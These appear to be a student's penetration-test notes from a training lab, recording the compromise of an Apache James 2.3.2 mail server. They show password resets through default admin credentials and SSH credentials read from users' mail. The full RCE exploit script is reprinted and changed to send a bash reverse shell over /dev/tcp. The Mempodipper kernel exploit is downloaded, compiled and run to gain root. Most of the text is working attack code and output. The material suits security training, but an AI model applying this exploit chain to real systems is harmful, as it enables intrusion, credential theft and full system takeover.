```shell
# go over tomorrow.
#connected to the nntp service

┌──(root㉿kali)-[/home/kali]
└─# telnet 10.11.1.72 119        
Trying 10.11.1.72...
Connected to 10.11.1.72.
Escape character is '^]'.
List
200 beta NNTP Service Ready, posting permitted
215 list of newsgroups follows
org.apache.avalon.dev 0 0 y
org.apache.avalon.user 0 0 y
org.apache.james.user 0 0 y
org.apache.james.dev 0 0 y
.
HELP
100 Help text follows
.
```


```c
#searchsploit apache james
Apache James Server 2.2 - SMTP Denial of Service                                                                                                                                                           | multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                                                                                                       | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                                                                                                       | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                                                                                             | linux/remote/50347.py

# tried to exploit using the Apache JAMES Server RCE but didnt work
```


```shell
# always check ports! - got delayed due to mistyping ports

┌──(root㉿kali)-[/usr/share]
└─# telnet 10.11.1.72 4445   
Trying 10.11.1.72...
telnet: Unable to connect to remote host: Connection refused
                                                                                
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 4445   
(UNKNOWN) [10.11.1.72] 4445 (?) : Connection refused
                                                                                
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 4555 -C
(UNKNOWN) [10.11.1.72] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:


# was able to connect to 4555 service and set passwords for users.
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 4555 -C 
(UNKNOWN) [10.11.1.72] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP   
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listsuers
Unknown command listsuers
listusers
Existing accounts 6
user: marcus
user: john
user: mailadmin
user: jenny
user: ryuu
user: joe45
setpassword marcus 1234
Password for marcus reset
setpassword john 1234
Password for john reset
setpassword mailadmin 1234
Password for mailadmin reset
setpassword jenny 1234
Password for jenny reset
setpassword ryuu 1234
Password for ryuu reset
setpassword joe45 1234
Password for joe45 reset

```

```shell
# going to login to pop server with all users

# marcus
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C 
(UNKNOWN) [10.11.1.72] 110 (pop3) open
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
marcus
-ERR
help
-ERR
USER marcus
+OK
PASS 1234
+OK Welcome marcus
LIST
+OK 0 0
.
QUIT

#john
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C
(UNKNOWN) [10.11.1.72] 110 (pop3) open
user +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
john
+OK
pass 1234
+OK Welcome john
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.

#mailadmin
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C
(UNKNOWN) [10.11.1.72] 110 (pop3) open
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
user mailadmin
+OK
pass 1234
+OK Welcome mailadmin
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
                                          

#JENNY
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C
(UNKNOWN) [10.11.1.72] 110 (pop3) open
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
user jenny
+OK
pass 1234
+OK Welcome jenny
list
+OK 0 0
.

# ryuu login, has 2 emails!
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C
(UNKNOWN) [10.11.1.72] 110 (pop3) open
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
user ryuu 
+OK
pass 1234
+OK Welcome ryuu
list
+OK 2 1807
1 786
2 1021
.
quit
+OK Apache James POP3 Server signing off.
                                        

# joe45
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C
(UNKNOWN) [10.11.1.72] 110 (pop3) open
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
user joe45
+OK
pass 1234
+OK Welcome joe45
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.


# extracted ssh creds from smtp server
┌──(root㉿kali)-[/usr/share]
└─# nc -nv 10.11.1.72 110 -C
(UNKNOWN) [10.11.1.72] 110 (pop3) open
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
user ryuu
+OK
pass 1234
+OK Welcome ryuu
list
+OK 2 1807
1 786
2 1021
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <19262980.2.1420734423735.JavaMail.root@pop3>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ryuu@localhost
Received: from localhost ([127.0.0.1])
          by pop3 (JAMES SMTP Server 2.3.2) with SMTP ID 874
          for <ryuu@localhost>;
          Thu, 8 Jan 2015 11:27:01 -0500 (EST)
Date: Thu, 8 Jan 2015 11:27:01 -0500 (EST)
From: mailadmin@localhost
Dear Ryuu,

Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any command you need to your path.

username: ryuu
password: QUHqhUPRKXMo4m7k

Kind regards,

Matt
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <32288226.1.1420734296374.JavaMail.root@pop3>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ryuu@localhost
Received: from localhost ([127.0.0.1])
          by pop3 (JAMES SMTP Server 2.3.2) with SMTP ID 59
          for <ryuu@localhost>;
          Thu, 8 Jan 2015 11:24:53 -0500 (EST)
Date: Thu, 8 Jan 2015 11:24:53 -0500 (EST)
From: mailadmin@localhost
Dear Ryuu,

Welcome to AAC and the IT team! I am delighted you are joining us as a junior analyst. Your role is critical in fulfilling the mission of our department and AAC.
The enclosed information is designed to serve as an introduction to IT and provide resources that will help you make a smooth transition into your new role.
The IT team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at AAC.

Kind regards,

Matt

```

```shell
# on as restricted shell , cant do anything

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ryuu@beta:~$ whoami
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
ryuu@beta:~$ ls
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
ryuu@beta:~$ cd
-rbash: cd: restricted
ryuu@beta:~$ 

# going back to exploit the  Apache James Server 2.3.2 - Remote Command Execution
with the 35513.py modified exploit.



```

```shell
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload                        - modified this  to show if payload worked!
payload = 'echo $USER && cat /etc/issue' # to exploit on any user
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."




# modified one line of the code above


# threw exploit
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.72]
└─# python2 35513.py 10.11.1.72
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.

# and logged into ssh server with 

username: ryuu
password: QUHqhUPRKXMo4m7k

# allowed us to execute commands outside of the restricted shell
┌──(root㉿kali)-[/usr/share]
└─# ssh ryuu@10.11.1.72
ryuu@10.11.1.72's password: 
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/

Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '12.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Mar 29 22:51:05 2023 from 192.168.119.157
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317\335\254\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: @team.pl>
Message-ID: <710491.0.1680147442647.JavaMail.root@beta>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 192.168.119.157 ([192.168.119.157])
          by beta (JAMES SMTP Server 2.3.2) with SMTP ID 626
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 29 Mar 2023 23:37:07 -0400 (EDT)
Date: Wed, 29 Mar 2023 23:37:07 -0400 (EDT)
From: team@team.pl

: No such file or directory
ryuu
Ubuntu 11.10 \n \l

-rbash: $'\r': command not found
ryuu@beta:~$ 
```


```shell
# part of the code that was modified to put in a reverse shell since the last shell worked
# would be found just in revshells.com

# specify payload
payload = '/bin/bash -i >& /dev/tcp/192.168.119.157/443 0>&1' 
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)

```

```shell

# caught revshell but have no access to any commands, need to adjust path
┌──(root㉿kali)-[/usr/share]
└─# nc -lvnp 443      
listening on [any] 443 ...
connect to [192.168.119.157] from (UNKNOWN) [10.11.1.72] 54286
ryuu@beta:~$ 
ryuu@beta:~$ 
ryuu@beta:~$ whoami
whoami
Command 'whoami' is available in '/usr/bin/whoami'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.

# fixed path
ryuu@beta:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:

# have access to commands
ryuu@beta:~$ whoami
whoami
ryuu

# still no terminal access, need to upgrade to a tty
ryuu@beta:~$ su
su
su: must be run from a terminal
ryuu@beta:~$ 

#upgraded tty shell
ryuu@beta:~$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
ryuu@beta:~$ su
su
Command 'su' is available in '/bin/su'
The command could not be located because '/bin' is not included in the PATH environment variable.
su: command not found
ryuu@beta:~$ 


#had to add bin to path to check su, and we now have an interacty pty shell
ryuu@beta:~$ export PATH=$PATH:/bin
export PATH=$PATH:/bin
ryuu@beta:~$ su
su
Password: 

# checking version numbers to priv esc
ryuu@beta:~$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=11.10
DISTRIB_CODENAME=oneiric
DISTRIB_DESCRIPTION="Ubuntu 11.10"
ryuu@beta:~$ uname -a
uname -a
Linux beta 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 athlon i386 GNU/Linux
ryuu@beta:~$ 


#googling Linux beta 3.0.0-12-generic privesc brought up mempodipper, going to try it.
Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)           | exploits/linux/local/18411.c

# need to update path with gcc location to run c code
ryuu@beta:~$ gcc
gcc
Command 'gcc' is available in '/usr/bin/gcc'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
gcc: command not found

# hosting python web server
──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.72]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.72 - - [30/Mar/2023 00:09:45] "GET /18411.c HTTP/1.0" 200 -


#wgetting mempodipper
ryuu@beta:/tmp$ wget http://192.168.119.157/18411.c
wget http://192.168.119.157/18411.c

#compiling mempodipper
ryuu@beta:/tmp$ gcc 18411.c -o mempodipper
gcc 18411.c -o mempodipper

# ensuring that it was compiled
ryuu@beta:/tmp$ ls -la
ls -la
total 36
drwxrwxrwt  3 root root  4096 2023-03-30 00:10 .
drwxr-xr-x 23 root root  4096 2015-01-07 05:56 ..
-rw-rw-r--  1 ryuu ryuu  6199 2023-03-30 00:08 18411.c
-rwxrwxr-x  1 ryuu ryuu 12290 2023-03-30 00:10 mempodipper
drwx------  2 root root  4096 2023-03-29 22:13 vmware-root

#executing mempodipper
ryuu@beta:/tmp$ ./mempodipper
./mempodipper
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================

[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/2281/mem in child.
[+] Sending fd 3 to parent.
[+] Received fd at 5.
[+] Assigning fd 5 to stderr.
[+] Reading su for exit@plt.
[+] Resolved exit@plt to 0x8049520.
[+] Calculating su padding.
[+] Seeking to offset 0x8049514.
[+] Executing su with shellcode.
# whoami
whoami
root
# 



#proof.txt
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt
94b90a5f2996a89b71d814d4f96c22f3
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:50:56:86:d4:7e brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.72/16 scope global eth0
    inet6 fe80::250:56ff:fe86:d47e/64 scope link 
       valid_lft forever preferred_lft forever

```


![[1. proof.txt.png]]